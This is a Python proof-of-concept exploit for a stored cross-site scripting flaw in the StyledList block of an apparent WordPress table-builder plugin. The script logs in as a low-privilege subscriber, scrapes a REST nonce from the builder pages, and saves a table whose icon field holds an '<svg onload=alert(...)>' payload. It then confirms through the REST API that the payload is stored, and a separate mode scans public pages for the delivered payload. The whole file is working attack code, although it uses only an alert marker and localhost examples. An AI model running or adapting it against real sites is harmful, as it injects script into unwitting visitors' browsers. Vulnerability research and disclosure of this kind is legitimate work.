#!/usr/bin/env python3
"""
PoC for Stored XSS in StyledList block.
Only stdlib is used.

Modes:
  1. Detect (no auth, checks a public post/page for delivered payload):
       python3 poc.py --url=<url-post/page>

  2. Auto-exploit (subscriber with builder delegation stores payload):
       python3 poc.py --base=<wp-base> --user=<sub> --password=<pw> [--marker=PWNED --table-id=0 --title=poc]
       Example:
       python3 poc.py --base=http://localhost:8851/wordpress --user=subtest --password=subtest123

Exploit flow:
  login via wp-login.php -> GET builder page (admin.php?page=wptb) ->
  parse WPTB_CFG wp_rest nonce -> POST /wp-json/wp-table-builder/save
  with styledList iconSVG=<svg onload=alert("MARKER")> ->
  verify via GET /wp-json/wp-table-builder/table?id=X.

Exit codes: 1 = vulnerable/exploited, 0 = clean/blocked, 2 = error/precondition failed.
"""
import argparse
import http.cookiejar
import json
import re
import sys
import urllib.parse
import urllib.request

PATTERNS = [
    (r"<svg[^>]*\bonload\s*=", "svg onload handler"),
    (r"<script[^>]*>.*?alert\s*\(", "script tag with alert"),
    (r"<img[^>]*\bonerror\s*=", "img onerror handler"),
    (r"<svg[^>]*>", "raw svg tag inside icon container"),
    (r'data-wptb-styled-list-icon-src="[^"]*"\s+on\w+\s*=', "attribute-breakout in icon-src"),
    (r'style="[^"]*fill:\s*[^"]*"\s+on\w+\s*=', "attribute-breakout after fill style"),
]

BUILDER_PAGES = [
    "/wp-admin/admin.php?page=wptb",
    "/wp-admin/admin.php?page=wptb-create",
    "/wp-admin/admin.php?page=wptb-builder",
]


def fetch_public(url: str, timeout: int = 15) -> str:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (PoC)"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        charset = r.headers.get_content_charset() or "utf-8"
        return r.read().decode(charset, errors="ignore")


def detect_url(url: str) -> int:
    try:
        body = fetch_public(url)
    except Exception as e:
        print(f"[ERROR] failed to fetch {url}: {e}")
        return 2
    if "wptb-styled-list-icon" not in body:
        print("[CLEAN] no wptb-styled-list-icon container found (no StyledList table on this URL).")
        return 0
    blocks = re.findall(r'<div class="wptb-styled-list-icon".*?</div>', body, flags=re.S)
    if not blocks:
        print("[CLEAN] StyledList container present but no icon div matched.")
        return 0
    findings = []
    for b in blocks:
        for pat, label in PATTERNS:
            m = re.search(pat, b, flags=re.S | re.I)
            if m:
                s = max(0, m.start() - 200)
                e = min(len(b), m.end() + 200)
                findings.append((label, b[s:e].strip()))
                break
    if findings:
        print(f"[VULNERABLE] Stored XSS sink delivered on {url}")
        print(f"Icon blocks checked: {len(blocks)}, hits: {len(findings)}")
        for label, snippet in findings[:3]:
            print(f"\n--- {label} ---")
            print(snippet[:800])
        print("\nTo confirm execution: open the URL in a real browser (Chromium/Chrome).")
        print('Expected alert dialog from <svg onload=alert(...)>.')
        return 1
    print("[CLEAN] StyledList icon output looks escaped on this URL.")
    return 0


def make_body(marker: str) -> dict:
    svg = f'<svg onload=alert("{marker}")>'
    item = {"text": "hello", "toolTip": "", "alignment": "left", "toolTipStyle": "",
            "color": "#000", "icon": "check", "iconColor": "red", "iconSVG": svg}
    block = {"type": "styledList",
             "props": {"padding": "", "margin": "", "itemSpacing": "5px", "iconSize": "20px",
                       "iconColor": "red", "icon": "check", "color": "#000",
                       "fontSize": "14px", "iconSpacing": "5px"},
             "items": [item]}
    cell = {"props": {"padding": "5px", "borderWidth": "1px",
                      "borderColor": "#000", "borderStyle": "solid"},
            "blocks": [block]}
    row = {"props": {"background": "#fff"}, "cells": [cell]}
    return {
        "props": {"tableSpacingX": "0", "tableSpacingY": "0", "borderCollapse": "collapse",
                  "minWidth": "", "padding": "", "borderWidth": "1px", "borderColor": "#000",
                  "borderStyle": "solid", "fontColor": "#000", "fontSize": "14px", "cols": 1},
        "rows": [row],
    }


def login(base: str, user: str, password: str):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    data = urllib.parse.urlencode(
        {"log": user, "pwd": password, "rememberme": "forever",
         "wp-submit": "Log In", "redirect_to": base + "/wp-admin/", "testcookie": "1"}
    ).encode()
    req = urllib.request.Request(base + "/wp-login.php", data=data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    op.open(req, timeout=15)
    return op


def get_builder_nonce(op, base: str) -> str:
    for p in BUILDER_PAGES:
        try:
            with op.open(base + p, timeout=15) as r:
                html = r.read().decode("utf-8", errors="ignore")
        except Exception:
            continue
        m = re.search(r'"wp_rest"\s*:\s*"([a-f0-9]+)"', html)
        if m:
            return m.group(1)
    return ""


def exploit(base: str, user: str, password: str, marker: str, table_id: int, title: str) -> int:
    base = base.rstrip("/")
    print(f"[*] login as {user} @ {base}")
    try:
        op = login(base, user, password)
    except Exception as e:
        print(f"[ERROR] login failed: {e}")
        return 2
    nonce = get_builder_nonce(op, base)
    if not nonce:
        print("[BLOCKED/ERROR] no wp_rest nonce from builder pages.")
        print("Precondition likely unmet: admin must add this role to Table Builder Settings > allowed_roles.")
        return 2
    print(f"[*] nonce {nonce[:6]}... obtained, saving StyledList payload marker={marker!r}")
    body = make_body(marker)
    payload = json.dumps({"id": table_id, "content": json.dumps(body), "title": title}).encode()
    req = urllib.request.Request(
        base + "/wp-json/wp-table-builder/save", data=payload,
        headers={"Content-Type": "application/json", "X-WP-Nonce": nonce}, method="POST")
    try:
        with op.open(req, timeout=15) as r:
            resp = json.loads(r.read().decode())
            print(f"[+] save HTTP {r.status}: {resp}")
    except Exception as e:
        try:
            b = e.read().decode()
            print(f"[-] save blocked/failed HTTP {e.code}: {b[:500]}")
            if e.code == 403:
                print("[BLOCKED] is_user_allowed()=false (default safe, delegation not enabled for this role).")
                return 0
        except Exception:
            print(f"[ERROR] save failed: {e}")
        return 2
    new_id = resp.get("id", table_id)
    # verify stored raw via REST read-back
    try:
        vreq = urllib.request.Request(
            base + f"/wp-json/wp-table-builder/table?id={int(new_id)}",
            headers={"X-WP-Nonce": nonce}, method="GET")
        with op.open(vreq, timeout=15) as r:
            vbody = r.read().decode()
            if marker in vbody:
                print(f"[VULNERABLE] marker {marker!r} stored raw in table {new_id} (verified via REST).")
                print(f"Embed with [wptb id=\"{new_id}\"] on a public post/page, open it as victim -> alert({marker!r}) fires.")
                return 1
            print("[-] marker not found in REST read-back (filtered?).")
            return 0
    except Exception as e:
        try:
            print(f"[WARN] read-back failed HTTP {e.code}; save succeeded so manual check needed.")
        except Exception:
            print(f"[WARN] read-back failed: {e}")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser(description="WP Table Builder StyledList Stored XSS PoC")
    ap.add_argument("--url", default="", help="Public post/page URL to detect delivered XSS")
    ap.add_argument("--base", default="", help="WP base URL, e.g. http://localhost:8851/wordpress")
    ap.add_argument("--user", default="", help="Attacker username (subscriber with delegation)")
    ap.add_argument("--password", default="", help="Attacker password")
    ap.add_argument("--marker", default="PWNED-BY-WPTB", help="Alert marker string")
    ap.add_argument("--table-id", type=int, default=0, help="0=new table, or existing ID to overwrite")
    ap.add_argument("--title", default="poc-table", help="Table title for new tables")
    args = ap.parse_args()

    if args.user and args.password and args.base:
        rc = exploit(args.base, args.user, args.password, args.marker, args.table_id, args.title)
        if args.url:
            print("\n--- checking --url ---")
            detect_url(args.url)
        return rc
    if args.url:
        return detect_url(args.url)
    ap.print_help()
    print("\nExamples:")
    print("  python3 poc.py --url=http://localhost:8851/wordpress/2026/11/12/front-sub-456/")
    print("  python3 poc.py --base=http://localhost:8851/wordpress --user=subtest --password=subtest123")
    return 2


if __name__ == "__main__":
    sys.exit(main())
